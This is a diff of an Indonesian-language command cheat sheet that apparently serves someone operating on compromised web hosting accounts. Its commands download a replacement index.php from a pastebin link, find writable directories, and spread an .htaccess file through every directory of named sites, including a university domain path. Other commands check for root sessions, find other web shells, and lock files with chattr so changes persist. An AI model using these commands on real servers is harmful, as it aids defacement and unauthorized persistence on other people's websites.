@@ -13,14 +13,17 @@ mv (item lama) (item baru) > mengganti nama file
 wget -O index.php (masukan link pastebin) > digunakan ketika tidak bisa membuat file menggunakan perintah nano
 curl -o index.php (masukan link pastebin)
 find ./ -writable -type d >> cari dir dalam domain
-find /var/www/fkip_uika_bo_usr/data/www/pvdf.fkip.uika-bogor.ac.id/wp-includes/ -type d -exec sh -c "cp /var/www/fkip_uika_bo_usr/data/www/pvdf.fkip.uika-bogor.ac.id/tes/.htaccess {}/.htaccess" \; -print >> sebar htaccess
+find /home/u7164532/public_html/journal/ -type d -exec sh -c "cp /home/u7164532/public_html/tes/.htaccess {}/.htaccess" \; -print >> sebar htaccess
 ps aux | grep pts >> cek ada yg root gk
 tty >> root
-
-ROOT
 find ./ -name "*.php" -exec sh -c "cat {} | grep 'eval('" \; -print  >>> cek shell
 find ./ -name "*.php" -exec sh -c "cat {} | grep 'base64'" \; -print  >>> cek shell
-
+find . -type f -name ".htaccess" >> untuk mencari file htaccess disemua dir
+find /home/u7164532/public_html/journal/ -type f -perm 444 >> untuk mencari file yang dikunci
+find /home/u7164532/public_html/pmb2/ -type d -perm 700 >> untuk mencari dir yang di kunci
+find /var/www/html/ejournal/ -type f -name ".htaccess" -exec chmod 644 {} \; >> untuk membuka kunci htaccess di semua dir
+======================================================
+ROOT
 sudo chattr +i /path/to/file >> untuk kunci file dalam root
 sudo chattr -i /path/to/file >> untuk membuka kunci file dalam root
 
